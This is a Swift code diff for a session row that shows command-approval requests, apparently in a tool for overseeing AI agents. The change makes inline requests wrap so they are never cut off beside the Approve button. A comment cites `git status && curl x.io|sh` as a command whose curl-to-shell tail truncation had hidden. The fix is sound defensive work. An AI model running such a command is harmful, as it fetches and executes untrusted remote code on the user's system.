@@ -26,8 +26,15 @@ struct CompactSessionRow: View {
         return nil
     }
 
-    /// Approve sits inline only when the compact line shows the whole
+    /// Approve sits inline only when the compact row shows the whole
     /// request. Anything longer is reviewed first, in the full preview.
+    ///
+    /// A character count cannot promise the request fits the line: at
+    /// medium scale the slot holds about a dozen characters, and SwiftUI
+    /// cut the rest off with Approve beside it, so `git status && curl
+    /// x.io|sh` read as `$ git status…`. An inline request therefore
+    /// wraps instead of truncating (see `line`), and the count only keeps
+    /// the row from growing past a line or two.
     private var approvesInline: Bool {
         guard let prompt = approvalPrompt else { return false }
         return prompt.offersApprove && ApprovalPreviewText.fitsOneLine(prompt.text)
@@ -87,12 +94,20 @@ struct CompactSessionRow: View {
             Group {
                 switch session.status {
                 case .waitingApproval(let prompt):
-                    if prompt.isExact {
+                    if prompt.isExact, approvesInline {
+                        // Approve sits beside this, so it is drawn whole: it
+                        // wraps and the row grows, and it is never cut.
+                        Text("$ \(ApprovalPreviewText.collapsed(prompt.text, maxLines: 1, columns: 40).text)")
+                            .swarmFont(.monoCompact)
+                            .foregroundStyle(.orange)
+                            .lineLimit(nil)
+                            .fixedSize(horizontal: false, vertical: true)
+                    } else if prompt.isExact {
                         let first = ApprovalPreviewText.collapsed(prompt.text, maxLines: 1, columns: 40)
                         Text("$ \(first.text)\(first.isCut ? "…" : "")")
                             .swarmFont(.monoCompact)
                             .foregroundStyle(.orange)
-                            .help(first.isCut ? "Open the full request to review it" : "")
+                            .help("Open the full request to review it")
                     } else {
                         Text("Request not readable here")
                             .foregroundStyle(.orange)
